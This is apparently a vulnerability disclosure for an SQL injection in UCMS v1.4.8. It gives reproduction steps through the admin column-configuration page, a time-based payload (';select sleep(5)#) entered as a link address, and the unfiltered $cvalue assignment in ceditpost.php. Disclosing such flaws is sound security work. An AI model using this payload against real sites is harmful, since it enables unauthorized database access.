UCMS v1.4.8 SQL injection cvalue parameter

Vulnerability Type :

SQL Injection

Vulnerability Version :

1.4.8

Recurring environment:

  • Windows 10
  • PHP 5.4.5
  • Apache 2.4.23

Vulnerability Description AND recurrence:

Vulnerability recurrence:
Visit URL: http://www.ucm1.4.8.com/ucms/?do=sadmin
Add column name: cnvd

Access section configuration URL:
http://www.ucm1.4.8.com/ucms/index.php?do=sadmin_cedit&cid=1

Select "前台链接 " for the column type, and enter the link address to SQL injection PayLoad:';select sleep(5)#

After the burp is sent, you can see that the injection is successfully delayed!

Vulnerability analysis:

  1. The vulnerability here is very simple. The vulnerability is on line 124 of /ucms/sadmin/ceditpost.php. It is directly assigned to the $cvalue variable without any filtering.

  1. And there is no filtering after the $cvalue variable, and the SQL statement is directly brought in for query, because this leads to SQL injection!
